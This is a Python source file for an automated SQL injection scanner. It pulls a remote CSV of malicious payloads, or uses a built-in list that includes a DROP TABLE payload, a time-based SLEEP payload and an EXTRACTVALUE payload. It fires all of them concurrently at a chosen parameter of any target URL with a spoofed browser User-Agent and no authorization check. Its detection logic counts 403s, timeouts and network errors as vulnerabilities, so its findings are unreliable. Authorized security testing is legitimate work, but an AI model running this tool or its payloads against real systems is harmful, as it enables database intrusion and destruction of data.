"""
Core SQL injection testing logic and payload management.
"""

import requests
import re
import time
import concurrent.futures
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from threading import Lock
import logging
from payloads import get_all_payloads, get_payloads_by_category, get_payload_stats

# Setup logging
logger = logging.getLogger(__name__)

class SQLInjectionTester:
    """
    Core class for SQL injection testing functionality.
    Manages payloads, executes tests, and analyzes responses.
    """
    
    def __init__(self):
        self.payloads = self._load_payloads()
        self.error_patterns = self._load_error_patterns()
        self.results_lock = Lock()
        
        # Initialize ML model if available
        try:
            from ml_model import SQLInjectionMLModel
            self.ml_model = SQLInjectionMLModel()
            model_info = self.ml_model.get_model_info()
            if model_info['rf_loaded']:
                logger.info(f"Random Forest model loaded successfully: {model_info}")
            else:
                logger.warning("Random Forest model not loaded - using traditional detection only")
        except Exception as e:
            logger.warning(f"Could not initialize ML model: {e}")
            self.ml_model = None
    
    def _load_payloads(self):
        """Load SQL injection payloads from the CSV dataset"""
        try:
            logger.info("Loading SQL injection payloads from CSV dataset...")
    
            # Try to load from the CSV file first
            csv_payloads = self._load_csv_payloads()
            if csv_payloads and len(csv_payloads) > 100:  # Only use CSV if we got a substantial number
                logger.info(f"Successfully loaded {len(csv_payloads)} payloads from CSV dataset")
                return csv_payloads
    
            # Fallback to local payloads.py file only if CSV fails
            logger.warning("CSV loading failed or returned insufficient payloads, falling back to local payloads.py file...")
            try:
                from payloads import get_all_payloads
                payloads = get_all_payloads()
                logger.info(f"Successfully loaded {len(payloads)} payloads from local file")
                return payloads
            except Exception as local_error:
                logger.error(f"Local payloads loading also failed: {local_error}")
    
        except Exception as e:
            logger.error(f"Error loading payloads: {e}")
    
        logger.info("Using minimal fallback payloads")
        return self._get_minimal_fallback_payloads()

    def _load_csv_payloads(self):
        """Load payloads from the CSV dataset"""
        import requests
        import csv
        from io import StringIO

        csv_url = "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/mbih-tvKJD7TTjrCGjADXX1qeMMs5vLOFH8.csv"

        try:
            # Download the CSV file
            response = requests.get(csv_url, timeout=30)
            response.raise_for_status()
        
            # Parse CSV content
            csv_content = StringIO(response.text)
            csv_reader = csv.reader(csv_content)
        
            # Skip header row
            headers = next(csv_reader)
            logger.info(f"CSV Headers: {headers}")
        
            payloads = []
            processed_count = 0
            skipped_count = 0
        
            for row in csv_reader:
                processed_count += 1
                if row and len(row) >= 2:  # Ensure we have both query and label columns
                    query = row[0].strip()  # First column is the SQL injection payload
                    label = row[1].strip()  # Second column is the label (1 for malicious)
                
                    # Only include payloads marked as malicious (label = 1)
                    if query and label == '1':
                        # Clean up the payload with minimal filtering
                        cleaned_payload = self._clean_payload_minimal(query)
                        if cleaned_payload:
                            # Avoid duplicates but keep all valid payloads
                            if cleaned_payload not in payloads:
                                payloads.append(cleaned_payload)
                        else:
                            skipped_count += 1
                    else:
                        skipped_count += 1
                else:
                    skipped_count += 1
    
            logger.info(f"Processed {processed_count} rows from CSV")
            logger.info(f"Skipped {skipped_count} invalid/duplicate payloads")
            logger.info(f"Extracted {len(payloads)} unique SQL injection payloads")
    
            # Save payloads to local cache for faster future loading
            try:
                import json
                with open('csv_payloads_cache.json', 'w', encoding='utf-8') as f:
                    json.dump(payloads, f, indent=2, ensure_ascii=False)
                logger.info("Payloads cached to csv_payloads_cache.json")
            except Exception as cache_error:
                logger.warning(f"Failed to cache payloads: {cache_error}")
    
            return payloads
    
        except Exception as e:
            logger.error(f"Error loading CSV payloads: {e}")
    
            # Try to load from local cache if CSV download fails
            try:
                import json
                with open('csv_payloads_cache.json', 'r', encoding='utf-8') as f:
                    cached_payloads = json.load(f)
                logger.info(f"Loaded {len(cached_payloads)} payloads from local cache")
                return cached_payloads
            except Exception as cache_error:
                logger.warning(f"Failed to load from cache: {cache_error}")
    
            return None

    def _clean_payload_minimal(self, payload):
        """Clean payload with minimal filtering to preserve all valid payloads"""
        if not payload:
            return None

        # Remove extra whitespace
        payload = payload.strip()

        # Skip only completely empty payloads
        if not payload:
            return None

        # Replace common placeholder patterns
        payload = payload.replace('__TIME__', '5')  # Replace time placeholders with 5 seconds

        # Remove excessive whitespace within the payload but preserve structure
        import re
        payload = re.sub(r'\s+', ' ', payload)

        # Only limit extremely long payloads (over 1000 characters)
        if len(payload) > 1000:
            return payload[:1000]  # Truncate instead of discarding

        return payload
    
    def _get_minimal_fallback_payloads(self):
        """Return minimal fallback payloads if all else fails"""
        return [
            "'",
            "''",
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "admin' or 1=1#",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe",
            "' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "1 or 1=1",
        ]
    
    def _load_error_patterns(self):
        """Load SQL error patterns for vulnerability detection"""
        patterns = [
            # MySQL
            r'mysql_fetch_array',
            r'mysql_fetch_assoc',
            r'mysql_fetch_row',
            r'mysql_num_rows',
            r'mysql_result',
            r'mysql_connect',
            r'mysql_query',
            r'Warning.*mysql_',
            r'valid MySQL result',
            r'MySQLSyntaxErrorException',
            r'com\.mysql\.jdbc',
            r'MySQL.*Error',
            r'mysql.*error',
            
            # PostgreSQL
            r'PostgreSQL.*ERROR',
            r'Warning.*\Wpg_',
            r'valid PostgreSQL result',
            r'Npgsql\.',
            r'PG::SyntaxError',
            r'org\.postgresql\.util\.PSQLException',
            r'PostgreSQL.*query failed',
            r'psql.*error',
            
            # SQL Server
            r'Driver.*SQL[-_ ]*Server',
            r'OLE DB.*SQL Server',
            r'(\W|A)SQL Server.*Driver',
            r'Warning.*mssql_',
            r'(\W|A)SQL Server.*[0-9a-fA-F]{8}',
            r'Exception.*\WSystem\.Data\.SqlClient\.',
            r'System\.Data\.SqlClient\.SqlException',
            r'SqlException',
            r'Microsoft.*ODBC.*SQL Server',
            r'ODBC.*SQL Server.*Driver',
            
            # Oracle
            r'\bORA-[0-9][0-9][0-9][0-9]',
            r'Oracle error',
            r'Oracle.*Driver',
            r'Warning.*\Woci_',
            r'Warning.*\Wora_',
            r'Oracle.*SQL.*Error',
            
            # Generic SQL errors
            r'SQL syntax.*MySQL',
            r'syntax error',
            r'unterminated quoted string',
            r'unexpected end of SQL command',
            r'Microsoft OLE DB Provider for ODBC Drivers',
            r'Microsoft OLE DB Provider for SQL Server',
            r'Unclosed quotation mark after the character string',
            r'quoted string not properly terminated',
            r'SQL.*Error',
            r'Database.*Error',
            r'Warning.*SQL',
            r'Error.*SQL',
            r'SQL.*Exception',
            r'database.*error',
            r'sql.*error',
            r'Invalid.*query',
            r'Query.*failed',
            r'Syntax.*error.*SQL',
            r'SQL.*command.*not.*properly.*ended',
            r'missing.*expression',
            r'ORA-\d+',
            r'Microsoft.*JET.*Database.*Engine.*error',
            r'ADODB\.Field.*error',
            r'BOF.*EOF',
            r'ADODB\.Command.*error',
            r'JET.*Database.*Engine.*error',
            r'Access.*Database.*Engine',
            r'Dynamic.*SQL.*Error',
            r'Warning.*include',
            r'Warning.*require',
            r'Fatal.*error',
            r'SQLSTATE',
            r'DB2.*SQL.*error',
            r'SQLITE_ERROR',
            r'sqlite3.*OperationalError',
            r'SQLite.*error',
            r'Warning.*sqlite_',
            r'valid.*SQLite.*result',
            r'Sybase.*message',
            r'Sybase.*Server.*message',
            r'SybSQLException',
            r'Sybase.*Database.*Error',
            r'com\.sybase\.jdbc',
            r'Invalid.*column.*name',
            r'Column.*count.*doesn.*match.*value.*count',
            r'Table.*doesn.*exist',
            r'Unknown.*column',
            r'Unknown.*table',
            r'Ambiguous.*column.*name',
            r'Division.*by.*zero.*error.*encountered',
            r'Incorrect.*syntax.*near',
            r'Cannot.*insert.*duplicate.*key.*row',
            r'Cannot.*insert.*the.*value.*NULL.*into.*column',
            r'Conversion.*failed.*when.*converting',
            r'String.*or.*binary.*data.*would.*be.*truncated',
            r'Input.*string.*was.*not.*in.*a.*correct.*format',
        ]
        
        logger.info(f"Loaded {len(patterns)} SQL error patterns")
        return patterns
    
    def get_payloads(self):
        """Return the list of available payloads"""
        return self.payloads
    
    def get_payload_categories(self):
        """Return payloads organized by category"""
        try:
            return get_payloads_by_category()
        except Exception as e:
            logger.error(f"Error getting payload categories: {e}")
            return {}
    
    def get_payload_statistics(self):
        """Return payload statistics"""
        try:
            # Try to get CSV statistics first
            csv_stats = self.get_csv_payload_statistics()
            if csv_stats['total_payloads'] > 0:
                return csv_stats
        
            # Fallback to local payloads.py statistics
            from payloads import get_payload_stats
            return get_payload_stats()
        
        except Exception as e:
            logger.error(f"Error getting payload statistics: {e}")
            return {
                'total_payloads': len(self.payloads),
                'categories': {},
                'category_count': 0
            }
    
    def get_csv_payload_statistics(self):
        """Get statistics about the CSV payload dataset"""
        try:
            # Categorize payloads based on common patterns
            categories = {
                'basic': [],
                'union_based': [],
                'boolean_blind': [],
                'time_based': [],
                'error_based': [],
                'comment_based': [],
                'encoded': [],
                'database_specific': [],
                'waf_bypass': [],
                'advanced': []
            }
            
            for payload in self.payloads:
                payload_lower = payload.lower()
                
                # Categorize based on payload content
                if 'union' in payload_lower and 'select' in payload_lower:
                    categories['union_based'].append(payload)
                elif any(keyword in payload_lower for keyword in ['sleep', 'waitfor', 'delay', 'pg_sleep', 'benchmark']):
                    categories['time_based'].append(payload)
                elif any(keyword in payload_lower for keyword in ['extractvalue', 'updatexml', 'exp', 'floor', 'rand']):
                    categories['error_based'].append(payload)
                elif any(keyword in payload_lower for keyword in ['or', 'and']) and any(op in payload for op in ['=', '>', '<']):
                    categories['boolean_blind'].append(payload)
                elif any(keyword in payload for keyword in ['/*', '*/', '--', '#']):
                    categories['comment_based'].append(payload)
                elif any(keyword in payload for keyword in ['%', 'char(', 'chr(', '0x']):
                    categories['encoded'].append(payload)
                elif any(keyword in payload_lower for keyword in ['mysql', 'oracle', 'mssql', 'postgresql', '@@version', 'version()']):
                    categories['database_specific'].append(payload)
                elif len(payload) > 100 or 'concat' in payload_lower:
                    categories['advanced'].append(payload)
                elif any(keyword in payload for keyword in ["'", '"', '`', '\\']):
                    categories['basic'].append(payload)
                else:
                    categories['waf_bypass'].append(payload)
            
            # Remove duplicates and get counts
            stats = {
                'total_payloads': len(self.payloads),
                'categories': {name: len(set(payloads)) for name, payloads in categories.items()},
                'category_count': len([cat for cat, payloads in categories.items() if payloads])
            }
            
            return stats
            
        except Exception as e:
            logger.error(f"Error getting CSV payload statistics: {e}")
            return {
                'total_payloads': len(self.payloads),
                'categories': {},
                'category_count': 0
            }
    
    def reload_payloads(self):
        """Reload payloads from the local file"""
        try:
            # Reload the payloads module
            import importlib
            import payloads
            importlib.reload(payloads)
            
            # Update payloads
            self.payloads = get_all_payloads()
            logger.info(f"Payloads reloaded successfully: {len(self.payloads)} payloads available")
            return True
        except Exception as e:
            logger.error(f"Error reloading payloads: {e}")
            return False
    
    def test_payload(self, url, parameter, payload, method, headers=None, cookies=None):
        """
        Test a single payload against the target.
        
        Args:
            url: Target URL
            parameter: Parameter name to inject into
            payload: SQL injection payload to test
            method: HTTP method (GET/POST)
            headers: Custom headers dict
            cookies: Cookie string
            
        Returns:
            dict: Test result with vulnerability analysis
        """
        start_time = time.time()
        
        try:
            # Prepare headers
            request_headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
            if headers:
                request_headers.update(headers)
            
            if cookies:
                request_headers['Cookie'] = cookies
            
            # Prepare request based on method
            if method.upper() == 'GET':
                # Parse URL and inject payload into parameter
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                query_params[parameter] = [payload]
                
                new_query = urlencode(query_params, doseq=True)
                test_url = urlunparse((
                    parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                    parsed_url.params, new_query, parsed_url.fragment
                ))
                
                response = requests.get(test_url, headers=request_headers, timeout=10, allow_redirects=False)
            else:
                # POST request
                request_headers['Content-Type'] = 'application/x-www-form-urlencoded'
                data = {parameter: payload}
                response = requests.post(url, data=data, headers=request_headers, timeout=10, allow_redirects=False)
            
            response_time = int((time.time() - start_time) * 1000)
            response_text = response.text
            
            # Analyze response for vulnerabilities
            vulnerability_detected = False
            detection_reason = "No vulnerability detected"
            error_detected = False
            risk_level = 'MINIMAL'
            
            # Check for SQL error patterns
            for pattern in self.error_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    error_detected = True
                    vulnerability_detected = True
                    detection_reason = f"SQL error pattern detected: {pattern}"
                    risk_level = 'HIGH'
                    break
            
            # Additional vulnerability checks
            if not vulnerability_detected:
                if response.status_code == 500:
                    vulnerability_detected = True
                    detection_reason = "Internal server error (500) - possible SQL error"
                    risk_level = 'MEDIUM'
                elif response_time > 5000:
                    vulnerability_detected = True
                    detection_reason = "Response time > 5 seconds - possible time-based injection"
                    risk_level = 'MEDIUM'
                elif len(response_text) == 0 and response.status_code == 200:
                    vulnerability_detected = True
                    detection_reason = "Empty response with 200 status - possible successful injection"
                    risk_level = 'LOW'
                elif response.status_code in [403, 406, 501, 999]:
                    vulnerability_detected = True
                    detection_reason = f"Suspicious HTTP status code ({response.status_code}) - possible WAF detection"
                    risk_level = 'LOW'
                elif 'blocked' in response_text.lower() or 'forbidden' in response_text.lower():
                    vulnerability_detected = True
                    detection_reason = "Response contains blocking/filtering indicators"
                    risk_level = 'LOW'
            
            # Random Forest ML-based vulnerability analysis
            ml_result = None
            response_analysis = None
            
            if hasattr(self, 'ml_model') and self.ml_model:
                try:
                    # Predict vulnerability using Random Forest model
                    ml_result = self.ml_model.predict_vulnerability(payload)
                    ml_confidence = ml_result.get('confidence', 0.0)
                    ml_vulnerable = ml_result.get('is_vulnerable', False)
                    ml_risk_level = ml_result.get('risk_level', 'MINIMAL')
                    
                    # Analyze response patterns
                    response_analysis = self.ml_model.analyze_response_patterns(
                        response_text, response.status_code, response_time
                    )
                    
                    # Combine traditional and ML detection
                    if ml_vulnerable and ml_confidence > 0.7:
                        vulnerability_detected = True
                        detection_reason = f"Random Forest model detected vulnerability (confidence: {ml_confidence:.2f}, risk: {ml_risk_level})"
                        risk_level = ml_risk_level
                    elif response_analysis['confidence_score'] > 0.5:
                        vulnerability_detected = True
                        detection_reason = f"Response pattern analysis detected vulnerability (score: {response_analysis['confidence_score']:.2f})"
                        risk_level = response_analysis['risk_level']
                    
                    # Update risk level if ML suggests higher risk
                    risk_levels = {'MINIMAL': 0, 'LOW': 1, 'MEDIUM': 2, 'HIGH': 3}
                    if risk_levels.get(ml_risk_level, 0) > risk_levels.get(risk_level, 0):
                        risk_level = ml_risk_level
                        
                except Exception as e:
                    logger.error(f"Error in ML analysis: {e}")
            
            return {
                'payload': payload,
                'status_code': response.status_code,
                'response_length': len(response_text),
                'vulnerability_detected': vulnerability_detected,
                'detection_reason': detection_reason,
                'response_time': response_time,
                'error_detected': error_detected,
                'risk_level': risk_level,
                'ml_analysis': ml_result,
                'response_analysis': response_analysis
            }
            
        except requests.exceptions.Timeout:
            return {
                'payload': payload,
                'status_code': 0,
                'response_length': 0,
                'vulnerability_detected': True,
                'detection_reason': 'Request timeout - possible time-based injection',
                'response_time': int((time.time() - start_time) * 1000),
                'error_detected': False,
                'risk_level': 'MEDIUM'
            }
        except requests.exceptions.ConnectionError:
            return {
                'payload': payload,
                'status_code': 0,
                'response_length': 0,
                'vulnerability_detected': False,
                'detection_reason': 'Connection error - target may be unreachable',
                'response_time': int((time.time() - start_time) * 1000),
                'error_detected': True,
                'risk_level': 'MINIMAL'
            }
        except Exception as e:
            return {
                'payload': payload,
                'status_code': 0,
                'response_length': 0,
                'vulnerability_detected': True,
                'detection_reason': f'Network error: {str(e)}',
                'response_time': int((time.time() - start_time) * 1000),
                'error_detected': True,
                'risk_level': 'LOW'
            }
    
    def test_target(self, target_url, parameter, method, custom_headers=None, cookies=None, max_workers=5):
        """
        Test all payloads against the target with threading.
        
        Args:
            target_url: Target URL to test
            parameter: Parameter name to inject into
            method: HTTP method (GET/POST)
            custom_headers: Custom headers string
            cookies: Cookie string
            max_workers: Maximum number of concurrent threads
            
        Returns:
            dict: Complete test results
        """
        results = []
        vulnerabilities_found = 0
        risk_summary = {'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'MINIMAL': 0}
        
        # Parse custom headers
        headers = {}
        if custom_headers:
            for line in custom_headers.split('\n'):
                if ':' in line:
                    key, value = line.split(':', 1)
                    headers[key.strip()] = value.strip()
        
        logger.info(f"Starting SQL injection test with {len(self.payloads)} payloads using {max_workers} threads")
        
        # Use ThreadPoolExecutor for concurrent testing
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            # Submit all payload tests
            future_to_payload = {
                executor.submit(self.test_payload, target_url, parameter, payload, method, headers, cookies): payload
                for payload in self.payloads
            }
            
            # Collect results as they complete
            for future in concurrent.futures.as_completed(future_to_payload):
                try:
                    result = future.result()
                    results.append(result)
                    
                    if result['vulnerability_detected']:
                        with self.results_lock:
                            vulnerabilities_found += 1
                    
                    # Count risk levels
                    risk_level = result.get('risk_level', 'MINIMAL')
                    risk_summary[risk_level] = risk_summary.get(risk_level, 0) + 1
                            
                    # Add small delay to avoid overwhelming the target
                    time.sleep(0.1)
                            
                except Exception as e:
                    payload = future_to_payload[future]
                    logger.error(f"Error testing payload '{payload}': {str(e)}")
                    results.append({
                        'payload': payload,
                        'status_code': 0,
                        'response_length': 0,
                        'vulnerability_detected': True,
                        'detection_reason': f'Test execution error: {str(e)}',
                        'response_time': 0,
                        'error_detected': True,
                        'risk_level': 'LOW'
                    })
        
        # Sort results by risk level and vulnerability status
        risk_order = {'HIGH': 0, 'MEDIUM': 1, 'LOW': 2, 'MINIMAL': 3}
        results.sort(key=lambda x: (
            not x['vulnerability_detected'], 
            risk_order.get(x.get('risk_level', 'MINIMAL'), 3),
            x['payload']
        ))
        
        # Calculate overall risk assessment
        if risk_summary['HIGH'] > 0:
            overall_risk = 'HIGH'
        elif risk_summary['MEDIUM'] > 0:
            overall_risk = 'MEDIUM'
        elif risk_summary['LOW'] > 0:
            overall_risk = 'LOW'
        else:
            overall_risk = 'MINIMAL'
        
        logger.info(f"Test completed: {vulnerabilities_found}/{len(self.payloads)} vulnerabilities found")
        logger.info(f"Risk summary: {risk_summary}")
        
        return {
            'success': True,
            'results': results,
            'total_payloads': len(self.payloads),
            'vulnerabilities_found': vulnerabilities_found,
            'target_url': target_url,
            'parameter': parameter,
            'risk_summary': risk_summary,
            'overall_risk': overall_risk
        }
